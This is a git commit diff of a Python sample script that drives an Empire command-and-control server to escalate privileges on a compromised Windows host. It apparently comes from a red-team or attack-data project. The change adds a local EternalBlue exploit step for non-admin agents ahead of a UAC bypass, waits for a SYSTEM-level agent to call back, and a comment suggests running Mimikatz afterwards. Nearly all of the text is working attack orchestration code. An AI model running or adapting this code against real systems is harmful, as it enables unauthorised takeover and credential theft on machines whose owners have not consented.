2987613b9575b71cf891dd958781bd9d915c8750
jc <jym@jym.sg>
2017-10-11 16:01:02 +0800

    refactored EoP procedure sample script

--- localEoP_procedure_example.py
+++ localEoP_procedure_example.py
@@ -9,28 +9,31 @@ from EmpireAPIWrapper import empireAPI
 from autocomplete.empire import privesc
 from stage2.external_c2 import empire_wait_for_agent, empire_get_timestamp
 from stage3.internal_reconn.windows import empire_is_user_admin
-from stage3.escalate_privilege.windows import empire_bypassUAC
+from stage3.escalate_privilege.windows import empire_bypassUAC, empire_localEternalBlue
 
 try: 
     # use a common API context instead of a new instance per technique script
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
     # we assume there's a non-privilege agent, some stager was executed before
-    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', False, 5)
+    hostname = 'WIN-7JKBJEGBO38'
+    agent = empire_wait_for_agent.run(API, hostname, False, 5)
     admin_type = empire_is_user_admin.run(API, agent['name']) 
-    if admin_type is None:
-        raise ValueError('BypassUAC can only be used with admin user')
-        # we could try other stuff to EoP but not in this example
     # to assist data labelling, we timestamp with reference to target machine
     timestamp = empire_get_timestamp.run(API, agent['name'])
-    print(timestamp + ' starting UAC bypass') # or log this
+    print(timestamp + ' starting local EoP') # or log this
+    if admin_type is None:
+        empire_localEternalBlue.run(API, agent['name'])
+        agent = empire_wait_for_agent.run(API, hostname, True, 120)
+        if agent is not None:
+            print('yeay!!! we got an SYSTEM user')
     empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
     # wait for privileged agent for 120 seconds
-    agent = empire_wait_for_agent.run(API,'WIN-7JKBJEGBO38', True, 120)
+    agent = empire_wait_for_agent.run(API, hostname, True, 120)
     if agent is not None:
         print('yeay!!! we got an {0} admin user'.format(admin_type))    
         # you can run Mimikatz or any privilege activities...    
     timestamp = empire_get_timestamp.run(API, agent['name'])
-    print(timestamp + ' ended UAC bypass') # or log this
+    print(timestamp + ' ended local EoP') # or log this
 except Exception as e:
     exc_type, exc_obj, exc_tb = sys.exc_info()
     fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
